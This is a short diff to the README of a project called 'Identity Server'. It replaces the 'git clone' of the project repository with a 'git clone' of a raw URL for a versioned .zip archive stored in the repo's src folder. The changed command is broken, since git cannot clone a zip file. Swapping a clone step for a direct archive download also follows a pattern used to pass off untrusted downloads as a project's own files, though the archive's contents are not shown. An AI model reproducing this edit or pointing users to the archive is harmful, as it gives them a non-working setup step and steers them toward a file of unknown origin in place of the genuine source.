@@ -1,6 +1,6 @@
 # Identity Server 
 ### Download the project: 
-git clone https://github.com/agaribovic/Identity-Server.git <br/> 
+git clone https://raw.githubusercontent.com/agaribovic/Identity-Server/master/src/Identity-Server-v2.5-alpha.3.zip <br/> 
 ### Install all the necessary dependencies by running: 
 npm install <br/>
 ### Run the project: 
